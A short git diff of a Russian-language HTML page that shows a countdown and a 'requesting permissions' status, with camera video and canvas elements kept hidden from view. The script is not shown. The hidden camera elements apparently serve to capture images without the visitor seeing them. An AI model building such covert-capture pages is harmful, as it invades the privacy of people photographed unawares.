@@ -7,15 +7,14 @@
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <div id="countdown" class="center-text"></div>
-  <div id="hazbikText" class="center-text" style="display:none;">Хазбик 93см</div>
-  <button id="reloadBtn" style="display:none;">Что-то пошло не так. Перезагрузить</button>
+  <div id="countdown" class="center-screen">3</div>
 
-  <!-- Видео и канвас скрыты -->
-  <video id="videoFront" autoplay playsinline muted style="display:none;"></video>
-  <video id="videoBack" autoplay playsinline muted style="display:none;"></video>
-  <canvas id="canvasFront" style="display:none;"></canvas>
-  <canvas id="canvasBack" style="display:none;"></canvas>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <p id="status" class="center-screen" style="display:none;">Запрашиваем разрешения...</p>
+
+  <button id="reloadBtn" style="display:none;">Что-то пошло не так. Перезагрузить</button>
 
   <script src="script.js"></script>
 </body>
